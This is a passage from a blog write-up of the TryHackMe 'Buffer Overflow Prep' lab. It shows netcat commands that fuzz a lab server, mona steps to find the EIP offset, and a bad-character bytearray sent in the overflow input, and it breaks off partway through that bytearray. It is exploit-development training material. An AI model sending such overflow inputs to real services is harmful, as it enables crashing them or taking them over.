            <span class="post-date" title="2021-07-11 03:06:52">2021/07/11</span>
        </a>
        
        <a  class="All Os "
           href="/post/Save-Arch-linux.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Get a shell when Arch Linux is broken">Get a shell when Arch Linux is broken</span>
            <span class="post-date" title="2021-07-07 06:55:56">2021/07/07</span>
        </a>
        
        <a  class="All Os "
           href="/post/Install-AUR-packages.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Installing AUR packages">Installing AUR packages</span>
            <span class="post-date" title="2021-07-04 13:45:52">2021/07/04</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF_gigachad.html"
           data-tag="Pentest"
           data-author="" >
            <span class="post-title" title="CTF-gigachad">CTF-gigachad</span>
            <span class="post-date" title="2021-07-01 04:15:52">2021/07/01</span>
        </a>
        
        <a  class="All Os "
           href="/post/Install-ArchLinux.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Arch Linux installation guide">Arch Linux installation guide</span>
            <span class="post-date" title="2021-07-01 04:15:52">2021/07/01</span>
        </a>
        
        <a  class="All Programing "
           href="/post/Create-an-IRC-bot-with-python.html"
           data-tag="IRC Python"
           data-author="" >
            <span class="post-title" title="Create an IRC bot with python">Create an IRC bot with python</span>
            <span class="post-date" title="2021-06-21 21:25:10">2021/06/21</span>
        </a>
        
        <a  class="All Service "
           href="/post/openVPN.html"
           data-tag="VPN"
           data-author="" >
            <span class="post-title" title="OpenVPN">OpenVPN</span>
            <span class="post-date" title="2021-06-20 17:53:11">2021/06/20</span>
        </a>
        
        <a  class="All Service "
           href="/post/Relais-tor.html"
           data-tag="Tor"
           data-author="" >
            <span class="post-title" title="Création d&#39;un relais tor avec debian 10">Création d&#39;un relais tor avec debian 10</span>
            <span class="post-date" title="2021-04-09 13:45:52">2021/04/09</span>
        </a>
        
        <a  class="All Security "
           href="/post/Secu-apache.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Securing an apache server">Securing an apache server</span>
            <span class="post-date" title="2021-03-09 12:45:52">2021/03/09</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-Buffer Overflow Prep for OSCP 1" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">Buffer Overflow Prep 1</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="Security">Security</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color1">Linux</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2023-02-26 10:53:21'>2023-02-25 21:30</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:1.8k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views 👀 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Prereq"><span class="toc-text">Prereq</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OVERFLOW-1"><span class="toc-text">OVERFLOW 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-where-it%E2%80%99s-crashing"><span class="toc-text">Find where it’s crashing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Inject-the-pattern"><span class="toc-text">Inject the pattern</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Finding-Bad-Characters"><span class="toc-text">Finding Bad Characters</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error"><span class="toc-text">Error</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Find-the-jump-point"><span class="toc-text">Find the jump point</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Generate-Payload"><span class="toc-text">Generate Payload.</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Prepend-NOPs"><span class="toc-text">Prepend NOPs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Preparing-the-Exploit"><span class="toc-text">Preparing the Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EIP"><span class="toc-text">EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESP"><span class="toc-text">ESP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EBP"><span class="toc-text">EBP</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p>
<h1 id="Prereq"><a href="#Prereq" class="headerlink" title="Prereq"></a>Prereq</h1><p>You have to start the server with the debugger.<br>Then listen with netcat.</p>
<p>You should have something like that:<br><img src="https://i.imgur.com/O8ltRJg.png"></p>
<h1 id="OVERFLOW-1"><a href="#OVERFLOW-1" class="headerlink" title="OVERFLOW 1"></a>OVERFLOW 1</h1><h2 id="Find-where-it’s-crashing"><a href="#Find-where-it’s-crashing" class="headerlink" title="Find where it’s crashing"></a>Find where it’s crashing</h2><p>He ask us to use he fuzzer to find where it’s crashing.<br>I wand to do it myself to learn.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">10.10</span>.5.89 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW1 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print("A"*100)'</span><span class="token variable">)</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/OShHTMw.png"><br>It’s crashing between 1500 and 2000.<br><img src="https://i.imgur.com/8MO7yqc.png"></p>
<p>Between 1970 and  1990<br><img src="https://i.imgur.com/Mtn9B5K.png"></p>
<p>At 1972 it’s ok, at 1973 it’s crashing.<br><img src="https://i.imgur.com/IUNdZsm.png"></p>
<h2 id="Inject-the-pattern"><a href="#Inject-the-pattern" class="headerlink" title="Inject the pattern"></a>Inject the pattern</h2><p>In the fuzzer it’s incrementing by 100, so I don’t have to be so precise.<br>The server crash at 1973, let’s create a string of 2000</p>
<p><img src="https://i.imgur.com/Iow70fc.png"><br>Now let’s find the offset with mona:<br><code>!mona findmsp -distance 2000</code><br><img src="https://i.imgur.com/LYfzR0k.png"></p>
<p><img src="https://i.imgur.com/LvHwIjc.png"></p>
<p>The EIP patternt is at 1978.<br>So I have to sent the prefix “OVERFLOW1 “ + 1978 letters A + few letters B.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -q <span class="token number">1</span> <span class="token number">10.10</span>.5.89 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW1 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print("A"*1978)'</span><span class="token variable">)</span></span><span class="token string">"BBBB"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.imgur.com/a8gtAi8.png"></p>
<p>BBBB = 42424242</p>
<h1 id="Finding-Bad-Characters"><a href="#Finding-Bad-Characters" class="headerlink" title="Finding Bad Characters"></a>Finding Bad Characters</h1><p>We have to do `!mona bytearray -b “\x00”:<br><img src="https://i.imgur.com/4nfCUnQ.png"><br>Let’s do the same in bash.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token variable">$i</span> <span class="token operator">!=</span> <span class="token number">256</span> <span class="token punctuation">]</span>
<span class="token keyword">do</span>
	<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">printf</span> <span class="token string">"%02x<span class="token entity" title="\n">\n</span>"</span> $i<span class="token variable">`</span></span>
	<span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$&#123;string&#125;</span>\x<span class="token variable">$&#123;x&#125;</span>"</span>
	<span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>
<span class="token keyword">done</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$string</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://i.imgur.com/pASIyz8.png"></p>
<p>I have to send the bytearray.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -q <span class="token number">1</span> <span class="token number">10.10</span>.5.89 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW1 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print("A"*1978)'</span><span class="token variable">)</span></span><span class="token string">"BBBB<span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\x0c">\x0c</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x17">\x17</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x19">\x19</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\x1c">\x1c</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x22">\x22</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x32">\x32</span><span class="token entity" title="\x33">\x33</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\x39">\x39</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\x44">\x44</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x46">\x46</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x49">\x49</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x4d">\x4d</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x55">\x55</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x5a">\x5a</span><span class="token entity" title="\x5b">\x5b</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x5d">\x5d</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x60">\x60</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x79">\x79</span><span class="token entity" title="\x7a">\x7a</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\x7c">\x7c</span><span class="token entity" title="\x7d">\x7d</span><span class="token entity" title="\x7e">\x7e</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x81">\x81</span><span class="token entity" title="\x82">\x82</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\x84">\x84</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x89">\x89</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x8d">\x8d</span><span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x90">\x90</span><span class="token entity" title="\x91">\x91</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x96">\x96</span><span class="token entity" title="\x97">\x97</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x9e">\x9e</span><span class="token entity" title="\x9f">\x9f</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\xa3">\xa3</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\xab">\xab</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\xb4">\xb4</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xb6">\xb6</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\xba">\xba</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\xbd">\xbd</span><span class="token entity" title="\xbe">\xbe</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\xc4">\xc4</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xca">\xca</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\xd4">\xd4</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xdb">\xdb</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xe4">\xe4</span><span class="token entity" title="\xe5">\xe5</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xea">\xea</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xf1">\xf1</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xf5">\xf5</span><span class="token entity" title="\xf6">\xf6</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xfb">\xfb</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\xff">\xff</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>And create it with mona too:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona bytearray -b <span class="token string">"<span class="token entity" title="\x00">\x00</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Now compare with the ESP rgister point:<br><img src="https://i.imgur.com/ioDIRnS.png"></p>
<p>I’m gonna do a little test, let’s see what append if I remove 2 B from the payload.<br><img src="https://i.imgur.com/JFZ94kV.png"><br>2 chars is missing in the ASCII part, the <code>\x</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona compare -f C:<span class="token punctuation">\</span>mona<span class="token punctuation">\</span>oscp<span class="token punctuation">\</span>bytearray.bin -a esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><p>It’s not working because he interpret my hex code as ASCII.</p>
<p>So I’m gonna input the payload in the python command only.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -q <span class="token number">1</span> <span class="token number">10.10</span>.5.89 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW1 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print("A"*1978 + "B"*4 + "<span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\x0c">\x0c</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x17">\x17</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x19">\x19</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\x1c">\x1c</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x22">\x22</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x32">\x32</span><span class="token entity" title="\x33">\x33</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\x39">\x39</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\x44">\x44</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x46">\x46</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x49">\x49</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x4d">\x4d</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x55">\x55</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x5a">\x5a</span><span class="token entity" title="\x5b">\x5b</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x5d">\x5d</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x60">\x60</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x79">\x79</span><span class="token entity" title="\x7a">\x7a</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\x7c">\x7c</span><span class="token entity" title="\x7d">\x7d</span><span class="token entity" title="\x7e">\x7e</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x81">\x81</span><span class="token entity" title="\x82">\x82</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\x84">\x84</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x89">\x89</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x8d">\x8d</span><span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x90">\x90</span><span class="token entity" title="\x91">\x91</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x96">\x96</span><span class="token entity" title="\x97">\x97</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x9e">\x9e</span><span class="token entity" title="\x9f">\x9f</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\xa3">\xa3</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\xab">\xab</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\xb4">\xb4</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xb6">\xb6</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\xba">\xba</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\xbd">\xbd</span><span class="token entity" title="\xbe">\xbe</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\xc4">\xc4</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xca">\xca</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\xd4">\xd4</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" 